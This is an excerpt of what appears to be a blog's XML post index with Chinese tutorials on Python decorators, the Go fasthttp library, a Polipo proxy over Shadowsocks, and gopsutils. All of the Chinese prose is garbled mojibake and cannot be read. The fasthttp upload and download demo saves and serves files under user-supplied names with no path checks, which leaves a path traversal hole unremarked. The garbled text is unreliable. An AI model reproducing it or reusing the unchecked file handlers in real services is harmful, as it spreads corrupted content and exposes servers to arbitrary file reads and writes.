è‡ªç„¶ä¸èƒ½åœ¨å®ƒä¹‹ä¸Šå†åŠ åˆ«çš„è£…é¥°å™¨ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜å¾ˆç®€å•ï¼Œåªè¦æŠŠä½ çš„è£…é¥°å™¨æ”¾åœ¨@staticmethodä¹‹å‰å°±å¥½äº†ï¼Œå› ä¸ºä½ çš„è£…é¥°å™¨è¿”å›çš„è¿˜æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å‡½æ•°ï¼Œç„¶åå†åŠ ä¸Šä¸€ä¸ª@staticmethodæ˜¯ä¸ä¼šå‡ºé—®é¢˜çš„ã€‚12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug() # è£…é¥°å®ä¾‹æ–¹æ³•ï¼ŒOK def run(self): print("&#123;&#125; is running!".format(self.model)) @staticmethod @debug() # é™æ€è£…é¥°å™¨æ”¾åˆ°æœ€åå°±okäº† def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) åˆ©ç”¨ç¬¬ä¸‰æ–¹åº“æ¥å†™è£…é¥°å™¨åµŒå¥—çš„è£…é¥°å‡½æ•°ä¸å¤ªç›´è§‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹åŒ…ç±»æ”¹è¿›è¿™æ ·çš„æƒ…å†µï¼Œè®©è£…é¥°å™¨å‡½æ•°å¯è¯»æ€§æ›´å¥½ã€‚ decoratordecorator.pyæ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„è£…é¥°å™¨åŠ å¼ºåŒ…ã€‚ä½ å¯ä»¥å¾ˆç›´è§‚çš„å…ˆå®šä¹‰åŒ…è£…å‡½æ•°wrapper() ï¼Œå†ä½¿ç”¨decorate(func, wrapper)æ–¹æ³•å°±å¯ä»¥å®Œæˆä¸€ä¸ªè£…é¥°å™¨ã€‚1234567891011121314151617181920@decoratordef debug(func, *args, **kwargs): print("[DEBUG] &#123;&#125;: enter &#123;&#125;()".format(datetime.now(), func.__name__)) return func(*args, **kwargs)@debugdef hello(name): """test""" print("hello %s" % name)@debugclass Hello(object): def __init__(self, name): self.name = namehello("Bob")print(inspect.getsource(hello))print(hello.__name__) decoratoræ¯”è¾ƒç®€é™‹, è¦è£…é¥°ç±»å’Œå¸¦å‚æ•°çš„è£…é¥°å°±ä¸èƒ½å¾ˆå¥½æ”¯æŒäº†ã€‚ wraptwraptæ˜¯ä¸€ä¸ªåŠŸèƒ½éå¸¸å®Œå–„çš„åŒ…ï¼Œç”¨äºå®ç°å„ç§ä½ æƒ³åˆ°æˆ–è€…ä½ æ²¡æƒ³åˆ°çš„è£…é¥°å™¨ã€‚ä½¿ç”¨ wrapt å®ç°çš„è£…é¥°å™¨ä½ ä¸éœ€è¦æ‹…å¿ƒä¹‹å‰ inspect ä¸­é‡åˆ°çš„æ‰€æœ‰é—®é¢˜ï¼Œå› ä¸ºå®ƒéƒ½å¸®ä½ å¤„ç†äº†ï¼Œç”šè‡³ inspect.getsource ( func ) ä¹Ÿå‡†ç¡®æ— è¯¯æ›´å…¨é¢çš„æ–‡æ¡£å¯ä»¥å‚è€ƒwraptå®˜æ–¹æ–‡æ¡£123456789101112131415161718192021222324252627282930313233343536373839404142434445from datetime import datetimeimport wraptdef debug(level='INFO'): @wrapt.decorator def wrapper(wrapped, instance, args, kwargs): print("[&#123;&#125;]: &#123;&#125; message".format(level, datetime.now())) return wrapped(*args, **kwargs) return wrapperclass Class(object): @debug() def function_im(self, arg1, arg2): pass @debug("DEBUG") @classmethod def function_cm(cls, arg1, arg2): pass @debug("ERROR") @staticmethod def function_sm(arg1, arg2): pass@debug()class Hello(): def __init__(self, name): self.name = name@debug()def hello(name): print("hello %s" % name)c = Class()c.function_im(1, 2)Class.function_im(c, 1, 2)Class.function_cm(1, 2)Class.function_sm(1, 2)h = Hello("Bob")hello("Bob") æ€»ç»“è£…é¥°å™¨çš„ç†å¿µæ˜¯å¯¹åŸå‡½æ•°ã€å¯¹è±¡çš„åŠ å¼ºï¼Œç›¸å½“äºé‡æ–°å°è£…ï¼Œæ‰€ä»¥ä¸€èˆ¬è£…é¥°å™¨å‡½æ•°éƒ½è¢«å‘½åä¸ºwrapper() ï¼Œæ„ä¹‰åœ¨äºåŒ…è£…ã€‚å‡½æ•°åªæœ‰åœ¨è¢«è°ƒç”¨æ—¶æ‰ä¼šå‘æŒ¥å…¶ä½œç”¨ã€‚æ¯”å¦‚@debug è£…é¥°å™¨å¯ä»¥åœ¨å‡½æ•°æ‰§è¡Œæ—¶é¢å¤–è¾“å‡ºæ—¥å¿—ï¼Œ @cacheè£…é¥°è¿‡çš„å‡½æ•°å¯ä»¥ç¼“å­˜è®¡ç®—ç»“æœç­‰ç­‰ã€‚æœ€åé¿å…é‡å¤é€ è½®å­æ¨èä½¿ç”¨wraptï¼Œé™¤éwraptçœŸä¸èƒ½æ»¡è¶³ä½ çš„ç‰¹æ€§éœ€æ±‚ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>deractor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é«˜æ€§èƒ½webä¹‹fasthttp]]></title>
    <url>%2F2017%2F01%2F25%2Ffasthttp%2F</url>
    <content type="text"><![CDATA[æµè§ˆç½‘ä¸Šåšå®¢æ—¶å‘ç°äº†è¿™ä¹ˆä¸€ç¯‡æµ‹è¯•æ–‡ç« nginx vs iris, ç»“æœæ˜¯irisè¶Šèƒœä¸€ç­¹, è€ŒIrisåº•å±‚ä½¿ç”¨çš„å¹¶ä¸æ˜¯Golangçš„HTTPçš„æ ‡å‡†åº“, è€Œæ˜¯ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“fasthttp, ä¹‹å‰è¯»è¿‡ä¸€ç‚¹å…³äºgolangçš„net/http, åœ¨å¤„ç†ç”¨æˆ·çš„è¯·æ±‚æ—¶çš„ç¡®æœ‰ç‚¹ç²—æš´, ç›´æ¥ä¸€ä¸ªè¿æ¥ä¸€ä¸ªgoroutine, å®Œå…¨æ²¡æœ‰å¹¶å‘çš„æ§åˆ¶ã€‚æŒ‰æºä¸åšå†…å¿ƒçš„å¥½å¥‡, æƒ³æ„Ÿå—ä¸€æŠŠfasthttp, æ¥ä¸€èµ·èµ°è¿›fasthttpçš„ä¸–ç•Œçœ‹çœ‹ã€‚ Benchmarkçš„çš„èƒœå‡ºgithubä¸Šé¢æœ‰ä¸€ä¸ªå¥½äº‹è€…å†™äº†ä¸€ä¸ªGo Webæ¡†æ¶æ€§èƒ½çš„å‹æµ‹å·¥å…·, ç»“æœæ˜¯fasthttpè¡¨ç°éå¸¸ä¼˜å¼‚, å…·ä½“è¯·æŸ¥çœ‹go-web-framework-benchmark githubåœ°å€è¯·å…è®¸æˆ‘è´´ä¸€å¼ ä»–çš„å›¾ ç®€ä»‹fasthttpæ˜¯Goçš„HTTPçš„ç¬¬ä¸‰æ–¹å®ç°, å®ƒå®£ç§°æ¯”æ ‡å‡†åº“net/httpå¿«10å€, æ˜¯ä¸€æ¬¾é«˜æ€§èƒ½çš„HTTPå®ç°ã€‚Githubä¸­çš„Fasthttp best practicesè¿™æ®µæè¿°äº†å®ƒä¸ºå•¥é«˜æ€§èƒ½çš„åŸå›  net/http çš„å®ç°æ˜¯ä¸€ä¸ªè¿æ¥æ–°å»ºä¸€ä¸ª goroutine; fasthttpæ˜¯åˆ©ç”¨ä¸€ä¸ª worker å¤ç”¨ goroutineï¼Œå‡è½» runtime è°ƒåº¦ goroutine çš„å‹åŠ› net/http è§£æçš„è¯·æ±‚æ•°æ®å¾ˆå¤šæ”¾åœ¨ map[string]string (http.Header) æˆ– map[string][]string (http.Request.Form)ï¼Œæœ‰ä¸å¿…è¦çš„ []byte åˆ° string çš„è½¬æ¢ï¼Œæ˜¯å¯ä»¥è§„é¿çš„ net/http è§£æ HTTP è¯·æ±‚æ¯æ¬¡ç”Ÿæˆæ–°çš„ http.Request å’Œ http.ResponseWriter; fasthttpè§£æ HTTP æ•°æ®åˆ° fasthttp.RequestCtx ï¼Œç„¶åä½¿ç”¨ sync.Poolå¤ç”¨ç»“æ„å®ä¾‹ï¼Œå‡å°‘å¯¹è±¡çš„æ•°é‡ fasthttpä¼šå»¶è¿Ÿè§£æ HTTP è¯·æ±‚ä¸­çš„æ•°æ®ï¼Œå°¤å…¶æ˜¯ Body éƒ¨åˆ†ã€‚è¿™æ ·èŠ‚çœäº†å¾ˆå¤šä¸ç›´æ¥æ“ä½œ Body çš„æƒ…å†µçš„æ¶ˆè€— ä½†æ˜¯å› ä¸ºfasthttpçš„å®ç°ä¸æ ‡å‡†åº“å·®è·è¾ƒå¤§ï¼Œæ‰€ä»¥APIçš„è®¾è®¡å®Œå…¨ä¸åŒ, å› æ­¤ä¹Ÿä¸å…¼å®¹æ ‡å‡†åº“net/httpã€‚ä½¿ç”¨æ—¶æ—¢éœ€è¦ç†è§£HTTPçš„å¤„ç†è¿‡ç¨‹ï¼Œåˆéœ€è¦æ³¨æ„å’Œæ ‡å‡†åº“çš„å·®åˆ«ã€‚ åŸºæœ¬ä½¿ç”¨åŸºæœ¬ç”¨æ³•å¾ˆç®€å•, 1. å†™å¥½handler 2. ç›‘å¬äº¤ç»™handlerå¤„ç†.12345678910111213141516171819package mainimport ( "fmt" "github.com/valyala/fasthttp")// ä½¿ç”¨RequestCtxä¼ é€’HTTPçš„æ•°æ®func httpHandler(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "hello fasthttp")&#125;// å¯åŠ¨æœåŠ¡æ—¶æŒ‡å®šå¤„ç†ä»»åŠ¡çš„handlerfunc main() &#123; if err := fasthttp.ListenAndServe("0.0.0.0:8080", httpHandler); err != nil &#123; fmt.Println("start fasthttp fail:", err.Error()) &#125;&#125; è·¯ç”±net/httpæä¾›http.ServeMuxå®ç°è·¯ç”±æœåŠ¡ï¼Œä½†æ˜¯åŒ¹é…è§„åˆ™ç®€é™‹ï¼ŒåŠŸèƒ½å¾ˆç®€å•ï¼ŒåŸºæœ¬ä¸ä¼šä½¿ç”¨ã€‚ fasthttpå¸å–æ•™è®­ï¼Œé»˜è®¤æ²¡æœ‰æä¾›è·¯ç”±æ”¯æŒã€‚å®˜æ–¹æåˆ°äº†4ä¸ªè·¯ç”±å®ç°: Iris, fasthttp-routing, fasthttproute, lu, ç¬¬ä¸€ä¸ªæ˜¯æ¡†æ¶, ç¬¬äºŒä¸‰ä¸ªæ˜¯å•çº¯çš„è·¯ç”±, ç¬¬4ä¸ªä¸çŸ¥é“ã€‚æˆ‘è¿™é‡Œé€‰æ‹©fasthttprouter, å› ä¸ºgithubä¸Šé¢è¿™ä¸ªé¡¹ç›®æ–‡æ¡£å’Œæ´»è·ƒåº¦æ¯”è¾ƒä¸é”™ å®‰è£…fasthttprouter12345678âœ Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;github.com/buaazp/fasthttprouter (download)github.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)github.com/buaazp/fasthttprouter ç®€å•ä½¿ç”¨è¯¦å°½çš„ä½¿ç”¨è¿˜å¾—å»çœ‹Githubæˆ–è€…æºç , è¯·å…è®¸æˆ‘è´´ä¸€æ®µå®˜æ–¹çš„ä»£ç , æˆ‘æœ¬åœ°ä¹Ÿç”¨ç€è¿™ä¸ªæµ‹12345678910111213141516171819202122232425package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Index(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "Welcome!\n")&#125;func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; è¯·æ±‚å’Œå“åº”åœ¨fasthttpä¸­ä½¿ç”¨ä¸€ä¸ªå¯¹è±¡æ¥ç»´æŠ¤è¯·æ±‚çš„ä¸Šä¸‹æ–‡:RequestCtx, å®ƒç»¼åˆäº†http.Requestå’Œhttp.ResponseWriterçš„æ“ä½œï¼Œå¯ä»¥æ›´æ–¹ä¾¿çš„è¯»å–å’Œè¿”å›æ•°æ®, é€šè¿‡ä¸‹å›¾è¿™ç§å¯¹ç…§è¡¨æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹å‡ºæ¥12345678910111213141516171819202122232425262728293031r.Body -&gt; ctx.PostBody()r.URL.Path -&gt; ctx.Path()r.URL -&gt; ctx.URI()r.Method -&gt; ctx.Method()r.Header -&gt; ctx.Request.Headerr.Header.Get() -&gt; ctx.Request.Header.Peek()r.Host -&gt; ctx.Host()r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()r.PostForm -&gt; ctx.PostArgs()r.FormValue() -&gt; ctx.FormValue()r.FormFile() -&gt; ctx.FormFile()r.MultipartForm -&gt; ctx.MultipartForm()r.RemoteAddr -&gt; ctx.RemoteAddr()r.RequestURI -&gt; ctx.RequestURI()r.TLS -&gt; ctx.IsTLS()r.Cookie() -&gt; ctx.Request.Header.Cookie()r.Referer() -&gt; ctx.Referer()r.UserAgent() -&gt; ctx.UserAgent()w.Header() -&gt; ctx.Response.Headerw.Header().Set() -&gt; ctx.Response.Header.Set()w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()w.WriteHeader() -&gt; ctx.SetStatusCode()w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()http.Error() -&gt; ctx.Error()http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FShttp.ServeFile() -&gt; fasthttp.ServeFile()http.Redirect() -&gt; ctx.Redirect()http.NotFound() -&gt; ctx.NotFound()http.StripPrefix() -&gt; fasthttp.PathRewriteFunc ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œåœ¨ä¸Šä¸‹æ–‡ä¸­è·å–è¯·æ±‚æ•°æ®, é€šè¿‡WriteStringæ¥è¿”å›å“åº”ã€‚1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.WriteString("hello,fasthttp") // å› ä¸ºå®ç°ä¸åŒï¼Œfasthttp çš„è¿”å›å†…å®¹ä¸æ˜¯å³åˆ»è¿”å›çš„ // ä¸åŒäºæ ‡å‡†åº“ï¼Œæ·»åŠ è¿”å›å†…å®¹åè®¾ç½®çŠ¶æ€ç ï¼Œä¹Ÿæ˜¯æœ‰æ•ˆçš„ ctx.SetStatusCode(404) // è¿”å›çš„å†…å®¹ä¹Ÿæ˜¯å¯ä»¥è·å–çš„ï¼Œä¸éœ€è¦æ ‡å‡†åº“çš„ç”¨æ³•ï¼Œéœ€è¦è‡ªå·±æ‰©å±• http.ResponseWriter fmt.Printf("Host: %s\n", ctx.Host()) fmt.Printf("Body: %s\n", ctx.Response.Body()) fmt.Printf("Path: %s\n", ctx.Path()) fmt.Printf("Method: %s\n", ctx.Method()) fmt.Printf("URI: %s\n", ctx.URI()) fmt.Printf("Connect Time: %s\n", ctx.ConnTime()) fmt.Printf("UserAgent: %s\n", ctx.UserAgent())&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; Bodyå¤„ç†fasthttp æä¾›æ¯”æ ‡å‡†åº“ä¸°å¯Œçš„ Body æ“ä½œ APIï¼Œè€Œä¸”æ”¯æŒè§£æ Gzip è¿‡çš„æ•°æ®, æˆ‘ä»¬å¯ä»¥ç®€å•çš„ä½¿ç”¨ä¸Šä¸‹æ–‡çš„PostBodyæ–¹æ³•è·å–body1234567891011121314151617181920212223242526272829303132package mainimport ( "encoding/json" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; body := ctx.PostBody() // è·å–åˆ°çš„æ˜¯ []byte fmt.Fprintf(ctx, "Body:%s", body) // å› ä¸ºæ˜¯ []byteï¼Œè§£æ JSON å¾ˆç®€å• var v interface&#123;&#125; json.Unmarshal(body, &amp;v) fmt.Printf("%v", v)&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; ç®€å•çš„æµ‹è¯•ç»“æœ12âœ Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125; è¡¨å•å¤„ç†RequestCtxæœ‰åŒæ ‡å‡†åº“çš„ FormValue() æ–¹æ³•ï¼Œè¿˜å¯¹ GET å’Œ POST/PUT ä¼ é€’çš„å‚æ•°è¿›è¡Œäº†åŒºåˆ†1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.SetContentType("text/html") // GET ?abc=abc&amp;abc=123 getValues := ctx.QueryArgs() fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", getValues.Peek("abc")) // Peek åªè·å–ç¬¬ä¸€ä¸ªå€¼ fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", bytes.Join(getValues.PeekMulti("abc"), []byte(","))) // PeekMulti è·å–æ‰€æœ‰å€¼ // POST xyz=xyz&amp;xyz=123 postValues := ctx.PostArgs() fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", postValues.Peek("xyz")) fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", bytes.Join(postValues.PeekMulti("xyz"), []byte(",")))&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; è¾“å‡ºç»“æœ:1234GET abc=abc GET abc=abc,123 POST xyz=xyz POST xyz=xyz,123 æ–‡ä»¶å¤„ç†fasthttpæä¾›ååˆ†å‹å¥½çš„æ¥å£, é€šè¿‡FromFileè¯»æ–‡ä»¶ä¸Šä¼ , é€šè¿‡SendFileæ¥æä¾›ä¸‹è½½,ä½†æ˜¯å¦‚æœä½ æƒ³æ›´åŠ æ–¹ä¾¿çš„å®šåˆ¶ä¸€äº›ä¿¡æ¯,æœ€å¥½ä½¿ç”¨MultipartFormæ¥è·å–ä¸Šä¼ å¯¹è±¡1234567891011121314151617// MultipartForm returns requests's multipart form.//// Returns ErrNoMultipartForm if request's content-type// isn't 'multipart/form-data'.//// All uploaded temporary files are automatically deleted after// returning from RequestHandler. Either move or copy uploaded files// into new place if you want retaining them.//// Use SaveMultipartFile function for permanently saving uploaded file.//// The returned form is valid until returning from RequestHandler.//// See also FormFile and FormValue.func (ctx *RequestCtx) MultipartForm() (*multipart.Form, error) &#123; return ctx.Request.MultipartForm()&#125; MultipartForm è¿”å›çš„æ˜¯ä¸€ä¸ªFormç»“æ„ä½“, æˆ‘ä»¬åœ¨ä»æºç ä¸­çœ‹çœ‹è¿™ä¸ªForm123456789// Form is a parsed multipart form.// Its File parts are stored either in memory or on disk,// and are accessible via the *FileHeader's Open method.// Its Value parts are stored as strings.// Both are keyed by field name.type Form struct &#123; Value map[string][]string File map[string][]*FileHeader&#125; æœ€å¥½æˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„åˆ†æå®ç°äº†ä¸€ä¸ªç®€å•çš„ä¸‹è½½å’Œä¸Šä¼ åŠŸèƒ½çš„å°Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package mainimport ( "fmt" "html/template" "io" "log" "strconv" "time" "crypto/md5" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")// Hello Handlerfunc Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;// Index Handler, é»˜è®¤çš„ContenTypeæ˜¯text/plain, è¾“å‡ºçš„å†…å®¹åœ¨preæ ‡ç­¾é‡Œé¢// å› æ­¤è¿™é‡Œå¿…é¡»æ‰‹åŠ¨è®¾ç½®ContentTypeä¸ºtext/htmlfunc Index(ctx *fasthttp.RequestCtx) &#123; ctx.Response.Header.SetContentType("text/html") t := template.New("index.gtpl") t, _ = t.Parse(`&lt;html&gt; &lt;head&gt; &lt;title&gt;ä¸Šä¼ æ–‡ä»¶&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt; &lt;input type="file" name="uploadfile" /&gt; &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt; &lt;input type="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;`) crutime := time.Now().Unix() h := md5.New() io.WriteString(h, strconv.FormatInt(crutime, 10)) token := fmt.Sprintf("%x", h.Sum(nil)) t.Execute(ctx, token)&#125;// UploadHandler is herefunc UploadHandler(ctx *fasthttp.RequestCtx) &#123; data, err := ctx.MultipartForm() if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("get upload file error:", err) return &#125; fileObj := data.File["uploadfile"][0] err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename) if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("save upload file error:", err) return &#125; ctx.Write([]byte("save file successfully!"))&#125;// DownloadHandler is herefunc DownloadHandler(ctx *fasthttp.RequestCtx) &#123; fileName := ctx.UserValue("filename") switch fileName := fileName.(type) &#123; case string: ctx.SendFile(fileName) default: ctx.SetStatusCode(500) fmt.Println("the filename is not string.") &#125;&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.POST("/upload", UploadHandler) router.GET("/download/:filename", DownloadHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>fasthttp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ©ç”¨Polipoæ„å»ºåŸºäºSSçš„http proxy]]></title>
    <url>%2F2017%2F01%2F24%2Fhttp-proxy%2F</url>
    <content type="text"><![CDATA[æè¿™ä¸ªçš„ä¸»è¦åŸå› æ˜¯golangçš„å¾ˆå¤šä¾èµ–åŒ…éœ€è¦ç¿»å¢™ä¸‹è½½, è¿™ä¸åƒPythonå’ŒNodeJSæœ‰å®˜æ–¹æºä»“åº“çš„è¯­è¨€(é…ç½®å›½å†…æºå¯ä»¥åŠ é€Ÿ). ä¹‹å‰ç”¨windowsçš„æ—¶å€™ä¹Ÿæ˜¯ä½¿ç”¨ss, è€Œhttp proxyæ˜¯é€šè¿‡chromeçš„ä¸€ä¸ªæ’ä»¶Proxy SwitchyOmegaæ¥åšçš„ï¼Œä½†æ˜¯åœ¨macä¸‹é¢è¿™æ‹›ä¸çµäº†, ä¸‹é¢ä¸»è¦ä»‹ç»macå¦‚ä½•åˆ©ç”¨ssæ­å»ºhttp proxy. å®‰è£…Shadowsocksssçš„å®‰è£…å’Œè¿è¡Œæ˜¯å‰æ, è¿™é‡Œä¸å¤šåšä»‹ç»ï¼Œå…·ä½“è¯·æŸ¥çœ‹Shadowsockså®‰è£…å’Œä½¿ç”¨ Polipoç®€ä»‹è¿™é‡Œä¸»è¦ä½¿ç”¨Polipoæ¥åšhttp proxy, polipoçš„å®˜æ–¹æ˜¯è¿™æ ·ä»‹ç»å®ƒçš„ï¼šâ€œPolipo æ˜¯ä¸€ä¸ªå°è€Œå¿«é€Ÿçš„ç¼“å­˜ web ä»£ç†ç¨‹åº(web ç¼“å­˜, HTTP ä»£ç†, ä»£ç†æœåŠ¡å™¨)ã€‚å°½ç®¡ Polipo æ˜¯ä¸ºä¸€ä¸ªäººæˆ–ä¸€å°ç¾¤äººä½¿ç”¨è€Œè®¾è®¡çš„ï¼Œä½†å¹¶ä¸å¦¨ç¢å®ƒä¸ºä¸€å¤§ç¾¤äººæ‰€ä½¿ç”¨ã€‚â€,è¯¥é¡¹ç›®çš„åœ°å€ polipo Githubåœ°å€, è¯¥é¡¹ç›®çš„å®˜æ–¹æ–‡æ¡£polipoå®˜æ–¹æ–‡æ¡£å¯æƒœè¯¥é¡¹ç›®çš„ä½œè€…å·²ç»åœæ­¢è¯¥é¡¹ç›®çš„ç»´æŠ¤äº†, ä¸”ç”¨ä¸”çæƒœã€‚ Polipoå®‰è£…Shadowsockså®˜æ–¹æ¨èhttp proxyä»£ç†ä¹Ÿæ˜¯Polipo, å®˜æ–¹å¯¹æ­¤ä¹Ÿåšäº†ç®€å•çš„æè¿°ï¼Œæˆ‘ç›´æ¥æŠ„è¿‡æ¥äº† å®‰è£…123apt-get install poliposervice polipo stoppolipo socksParentProxy=localhost:1080 ä»¥ä¸Šæ˜¯å®˜æ–¹æ–‡æ¡£é‡Œé¢çš„è¯´æ˜ï¼Œåœ¨macä¸‹ä½¿ç”¨polipoè¦ç¨åšä¿®æ”¹ macçš„å®‰è£…1brew install polipo Polipoä½¿ç”¨ sså¯¹polipoçš„ä½¿ç”¨æ ·ä¾‹ 1234567891011http_proxy=http://localhost:8123 apt-get updatehttp_proxy=http://localhost:8123 curl www.google.comhttp_proxy=http://localhost:8123 wget www.google.comgit config --global http.proxy 127.0.0.1:8123git clone https://github.com/xxx/xxx.gitgit xxxgit xxxgit config --global --unset-all http.proxy macçš„ä½¿ç”¨æ‰“å¼€ä¸€ä¸ªterminal, ä¸è¦å…³æ‰ï¼Œè±¡genymotionä¹‹ç±»çš„å…¶ä»–ç¨‹åºå°±å¯ä½¿ç”¨Httpä»£ç†äº†. 12âœ ~ polipo socksParentProxy=localhost:1080Established listening socket on port 8123. ç„¶åæˆ‘ä»¬ä½¿ç”¨ä½¿ç”¨è¯¥http proxyæ¥å®‰è£…golangåŒ…,è®°å¾—å¼€å¯çš„ä½ çš„ss123456âœ Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttpgithub.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)]]></content>
      <categories>
        <category>å¼€å‘å·¥å…·</category>
        <category>Shadowsocks</category>
      </categories>
      <tags>
        <tag>http-proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¤¸å¹³å°ç³»ç»Ÿç›‘æ§åº“-gopsutils]]></title>
    <url>%2F2017%2F01%2F22%2Fgopsutils%2F</url>
    <content type="text"><![CDATA[å¾ˆæ¬£èµtelegrafçš„æ¶æ„,ä¹‹å‰ä¹Ÿå¤šæ¬¡ä½¿ç”¨, æœ€è¿‘ä¹Ÿè¦é€šè¿‡ä»–æ¥è·å–ç³»ç»Ÿè¿è¡Œæ—¶ä¿¡æ¯ç„¶åä¸Šä¼ ,æ‰€ä»¥æƒ³å€Ÿé‰´ä¸‹telegrafé‡Œé¢çš„systemæ¨¡å—çš„å®ç°ï¼Œçœ‹äº†ä¸‹ä»–çš„æºç ï¼Œå‘ç°ä»–ä½¿ç”¨äº†ä¸€ä¸ªåå«gopsutilsåº“æ¥å®Œæˆæ‰€æœ‰çš„ç³»ç»Ÿæ•°æ®çš„é‡‡é›†çš„, äºæ˜¯å†³å®šæ‰‹åŠ¨è¯•è¯•è¿™ä¸ªåº“çš„åŠŸèƒ½ã€‚ ç®€ä»‹åœ¨è¯´gopsutilsä¹‹å‰æˆ‘ä»¬å¿…é¡»å…ˆè¯´ä¸‹psutilsæ˜¯å•¥, å› ä¸ºgopsutilså®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªgolangç‰ˆæœ¬çš„psutils(ä»åå­—ä¸Šä¹Ÿèƒ½çœ‹å‡ºæ¥)psutilsæ˜¯ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„pythonåº“, psutilsæ˜¯python process and system utilitiesçš„ä¸€ä¸ªç¼©å†™. å®ƒæœ‰å¦‚ä¸‹ç‰¹ç‚¹ è·¨å¹³å°: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSDçš„32ä½å’Œ64ä½ç³»ç»Ÿ åŠŸèƒ½ä¸°å¯Œ: 